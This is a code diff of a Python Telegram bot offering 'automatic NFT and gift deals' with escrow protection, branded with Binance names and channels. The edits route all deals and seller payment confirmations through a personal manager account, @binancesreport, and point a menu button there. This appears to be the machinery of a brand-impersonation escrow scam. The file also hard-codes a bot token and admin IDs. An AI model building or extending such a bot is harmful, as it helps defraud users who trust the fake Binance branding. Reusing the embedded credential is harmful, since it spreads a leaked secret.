@@ -17,7 +17,6 @@ from aiogram.client.default import DefaultBotProperties
 
 # ===== НАСТРОЙКИ =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8916641100:AAGTlz5A0Xr3ShfmG197dMN6Kp359c-NMxc")
-# Список ID администраторов (через запятую)
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8297446667,8734750156").split(",")]
 BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
 PORT = int(os.getenv("PORT", 8080))
@@ -91,7 +90,7 @@ def welcome_text():
         "1⃣ Автоматические сделки с NFT и подарками\n"
         f"2⃣ {shield_emoji()} Полная защита обеих сторон\n"
         f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
-        f"4⃣ {emoji('package')} Передача товаров через менеджера @binancesreport </blockquote>\n\n"
+        f"4⃣ {emoji('package')} Все сделки проходят через менеджера @binancesreport</blockquote>\n\n"
         f"{emoji('lamp')} Наш канал ─ @binance_announcements"
     )
 
@@ -150,7 +149,7 @@ def main_menu(lang="ru"):
          InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
         [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
          InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
-        [InlineKeyboardButton(text=t[6], url="https://t.me/legmk")]
+        [InlineKeyboardButton(text=t[6], url="https://t.me/binancesreport")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
@@ -600,12 +599,12 @@ async def new_deal_handler(call: CallbackQuery, state: FSMContext):
     txt = (
         "🤝 Создание P2P сделки\n\n"
         "Выберите свою роль в сделке:\n"
-        "• Продавец — вы получите оплату после подтверждения менеджером.\n"
+        "• Продавец — вы получите оплату после подтверждения менеджером @binancesreport.\n"
         "• Покупатель — вы получите товар после оплаты."
     ) if lang=="ru" else (
         "🤝 New P2P deal\n\n"
         "Choose your role:\n"
-        "• Seller — you'll receive payment after manager confirmation.\n"
+        "• Seller — you'll receive payment after confirmation by manager @binancesreport.\n"
         "• Buyer — you'll receive the item after payment."
     )
     await delete_and_send_banner(call, txt, deal_role_choice(lang))
@@ -817,7 +816,7 @@ async def lang_cb(call: CallbackQuery):
     save_data()
     await return_to_main(call, new_lang)
 
-# ===== ВВОД РЕКВИЗИТОВ (общий обработчик) =====
+# ===== ВВОД РЕКВИЗИТОВ =====
 @dp.message()
 async def handle_rekv_input(message: Message):
     uid = str(message.from_user.id)
